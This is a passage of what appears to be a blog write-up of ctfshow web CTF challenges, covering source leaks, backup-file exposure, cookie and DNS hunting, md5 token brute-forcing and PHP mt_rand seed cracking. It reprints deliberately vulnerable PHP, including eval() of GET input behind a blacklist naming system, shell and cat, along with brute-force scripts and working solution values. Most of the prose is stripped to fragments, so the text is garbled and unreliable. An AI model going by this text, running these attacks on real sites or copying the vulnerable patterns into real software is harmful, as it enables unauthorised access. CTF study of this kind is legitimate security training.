src="https://img-blog.csdnimg.cn/27bf54b0ccb4478d94089ce1a2c99afd.png#pic_center" alt="7"></p><p>flag</p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p></p><p>gitsvn.git.svnurl&#x2F;.git</p><p>&#x2F;.git&#x2F;.svn&#x2F;.gitflag</p><p><img src="https://img-blog.csdnimg.cn/c71171b9596a457a9de2f33409e5020f.png#pic_center" alt="8"></p><p><img src="https://img-blog.csdnimg.cn/f99e0efe08b94cffa35fb0b89c67f324.png#pic_center" alt="9"></p><h4 id="git-svn-"><a href="#git-svn-" class="headerlink" title="git svn "></a>git svn </h4><p>     <strong>gitsvn</strong><br>1.gitsvn<br>2.gitsvn<br>3.gitsvn<br>4.git<br>5.git<br>6.git<br>7.git<br>8.gitsvn</p><p><a href="https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&tn=monline_3_dg&wd=git%E5%92%8Csvn&oq=git&rsv_pq=b430d72200b4dd6f&rsv_t=999c8e4eC5soN/fN57lz7fw37UWO8FFEV83oxK4Llmxk1PdSlz9Mtjcx5JkGUeJCSXoZ&rqlang=cn&rsv_dl=tb&rsv_enter=1&rsv_sug3=8&rsv_sug1=7&rsv_sug7=100&rsv_sug2=0&rsv_btype=t&inputT=5881&rsv_sug4=9087">gitsvn</a></p><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>vim</p><p>vim.swp</p><p>vim.&lt;&gt;.php.swp.&lt;&gt;.php.swo.&lt;&gt;.php.swn</p><p><img src="https://img-blog.csdnimg.cn/47bf101e57d04da187598dcc27d1fd49.png#pic_center" alt="10"></p><p>url&#x2F;index.php.swpflag</p><p>       </p><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>cookie </p><p></p><p><img src="https://img-blog.csdnimg.cn/ef469b9758f141a19ca3fddc186a24d3.png" alt="11"></p><p>cookie<img src="https://img-blog.csdnimg.cn/439d83193a654d5bbb1e63afc6ac2b4b.png" alt="12"><br>flag</p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>flag.ctfshow.com <br><a href="http://dbcha.com/">dns</a><br><img src="https://img-blog.csdnimg.cn/f1d3798a100d410ab33338bcf3fad2cd.png" alt="13">txtflagTXT </p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p><br><img src="https://img-blog.csdnimg.cn/7f1240fdcf74469cb9d089eba6742563.png" alt=""><br><img src="https://img-blog.csdnimg.cn/22ac034131d54e918c466f472da1f461.png" alt="14"><br>flagctfshow{c9494549-232c-4a44-af85-06574f2ed4b7}</p><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p><br>document<br><img src="https://img-blog.csdnimg.cn/677b3711b60c469dbaf0f866ae4119cc.png" alt="15"><br><br><img src="https://img-blog.csdnimg.cn/0ad9cac0edb94e54baccc03df56b8e8c.png" alt="16"></p><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>(editor),<br><br><img src="https://img-blog.csdnimg.cn/6c8b1c4eb3ac4d29a51186d2839221eb.png" alt="17">&#x2F;editor<br><img src="https://img-blog.csdnimg.cn/0ef15f64db654755aec7a7a7c00fa38b.png" alt="18"><strong>tmp&#x2F;html&#x2F;nothinghere</strong>fl000g.txt, **&#x2F;nothinghere&#x2F;fl000g.txt**flag</p><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><p><strong></strong></p><p>QQQQ<br><img src="https://img-blog.csdnimg.cn/da05c6a03cad4131b2f010f9538c5320.png" alt="15"><br><br><img src="https://img-blog.csdnimg.cn/f22b46a6672d4a4bb5acecc3ff05f611.png" alt="15"><br>QQ <img src="https://img-blog.csdnimg.cn/2b245d352a024f6aae4c1a9f4c76ccaa.png" alt="15"><br>flag</p><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p><strong></strong><br>PHP</p><blockquote><p>phpPHP</p></blockquote><p><a href="https://baike.baidu.com/item/PHP%E6%8E%A2%E9%92%88/10922752">php</a><br><img src="https://img-blog.csdnimg.cn/20be60559dd64161aeb30a72d6de10ca.png" alt="16">**&#x2F;tz.php**<img src="https://img-blog.csdnimg.cn/25ab292735884c0f9edaf18fc619f12e.png" alt="16"><img src="https://img-blog.csdnimg.cn/38ddc1cf0aa64edca4df5cdde973a6af.png" alt="16"></p><p>PHP:<img src="https://img-blog.csdnimg.cn/cd667b76d4134efdb200a483efa46f30.png" alt="16"><br>ctfshowflag</p><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><p><strong>sql</strong><br><img src="https://img-blog.csdnimg.cn/ba8913b0cb3f4a9b82985fa9246120ab.png" alt="17"><strong>SQL</strong>backup**&#x2F;backup.sql**flag</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>sql<strong>backup.sql</strong></p><h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p><strong>101flag</strong><br><br><img src="https://img-blog.csdnimg.cn/17d6f2c0470645ee9e9d2bd951f760b3.png" alt="18"><br><img src="https://img-blog.csdnimg.cn/c113565d12794d029a997ed511c7685f.png" alt="18"><br>ctfshow<img src="https://img-blog.csdnimg.cn/6e200f592d7c46c794731761f8662f69.png" alt="18"><br><img src="https://img-blog.csdnimg.cn/51a0c388d55b4cb6896c98cfbecab8bb.png" alt="18"><br>110.php,flag</p><h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><p><strong></strong><br><img src="https://img-blog.csdnimg.cn/e438c4cc7a9f4e98ba0cbd0220c26d37.png" alt="19">post<br><img src="https://img-blog.csdnimg.cn/103ae3bb049e418e98478720a13f1862.png" alt="19"><br>flag</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>post<br><strong></strong></p><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><blockquote><p>mdbasp+access</p></blockquote><p><img src="https://img-blog.csdnimg.cn/41c86488b14649d38f44842262868a26.png" alt="20"></p><p>asp+accessaccess<br>mdbasp+access url&#x2F;db&#x2F;db.mdb txtEasyAccess.exeflag</p><h4 id="ACCESS"><a href="#ACCESS" class="headerlink" title="ACCESS"></a>ACCESS</h4><h5 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h5><p>ASPAccessAccess</p><h5 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h5><p>Access.mdbH42.mdbAccess</p><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>ASPform page.asp?x&#x3D;1x&#x3D;1 </p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><p><strong></strong><br><img src="https://img-blog.csdnimg.cn/50dec98ecd16438d95781995e710e7a3.png" alt="21"><br><br>bp<img src="https://img-blog.csdnimg.cn/2c342a9ab4b943a199bcd52181f7d1c2.png" alt="21"><br>base64<strong>:</strong><img src="https://img-blog.csdnimg.cn/dbf26459f49b4fb0bee29e0f9db2aed4.png" alt="21">OKsent to intruder<img src="https://img-blog.csdnimg.cn/612dc5429f6449928acd8dbb5fb6e1c4.png" alt="21">payloads<img src="https://img-blog.csdnimg.cn/944254253a544554ac2bc595ad056408.png" alt="21"><br><img src="https://img-blog.csdnimg.cn/df3fba6b116e4dac8fb8bbd36de533ee.png" alt="21"><br>**:**<img src="https://img-blog.csdnimg.cn/81b9ffed5f5a44618a64d6214facd8d4.png" alt="21"></p><p><img src="https://img-blog.csdnimg.cn/007a60a2824640ac90862574538a5351.png" alt="21"><br><img src="https://img-blog.csdnimg.cn/fe997425d5384d519b2a115c77240b45.png" alt="21"><br><img src="https://img-blog.csdnimg.cn/3d0bcebe5ac64f0bb317a4d11aa12ade.png" alt="21"><br><img src="https://img-blog.csdnimg.cn/da957508a007461b85eef29e440333e9.png" alt="21">base64flag<img src="https://img-blog.csdnimg.cn/eeb4c1d85335439da11f57fd4d455aac.png" alt="21"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>base64payloadscustom iterator()<strong></strong> positionbase64tomcat: &gt;position33base64<strong>payload processing</strong> Palyload Encoding</p><h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><p><strong>ctf.show</strong></p><p><a href="https://phpinfo.me/domain"></a><strong>vip.ctf.show</strong>flag<img src="https://img-blog.csdnimg.cn/3dfd59da05a249dd989cea14e7f0d166.png" alt="22"></p><h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><p><strong></strong><br></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-03 11:43:51# @Last Modified by:   h1xa# @Last Modified time: 2020-09-03 11:56:11# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><br>tokentokenmd5ifflag tokenPHP</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token number">10000</span><span class="token punctuation">:</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>token10000<strong>4221202</strong>url <strong>?token&#x3D;1202</strong>  <strong>?token&#x3D;422</strong> flag<br><strong></strong> python</p><h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-03 13:26:39# @Last Modified by:   h1xa# @Last Modified time: 2020-09-03 13:53:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /proc/version'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mt_srandseedmt_randmt_rand<a href="https://baike.baidu.com/item/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95/22800014"></a>seedmt_srandmt_rand</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/10e71b69aefc4ce6af505059950068dd.png" alt="24"><br>get?r&#x3D;1122388967,flag.</p><h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-03 13:56:57# @Last Modified by:   h1xa# @Last Modified time: 2020-09-03 15:47:33# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$rand</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /proc/version'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mt_scrand(seed)seedmt_rand()<br>seedseed</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>r0$randifelseGET?r&#x3D;0</p><p><img src="https://img-blog.csdnimg.cn/20875749074848f196d6b7b1fdc4ef49.png" alt="25"><br>lsphp_mt_seed* .&#x2F;php_mt_seed*<br>bprepeatersendphp7.0<br><img src="https://img-blog.csdnimg.cn/7d7b0b2bcd994279b5a64993de43eb05.png" alt="25"><br>php7.0)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">3095355977</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><br><img src="https://img-blog.csdnimg.cn/b91295d5b03f466fa046b44d34f332cd.png" alt="25"><br>:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>r&#x3D;1374935140!$rand,ifcookieflag<br>hackbargetcookieflag</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:49:10# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>GETccflag system  php cat sort shell .   <br>       <br>**system()<strong></strong>exec()<strong></strong>passthru()<strong></strong>shell_exec()**<br>cat</p><p><em>more:<br>less: more <br>head:<br>tac: 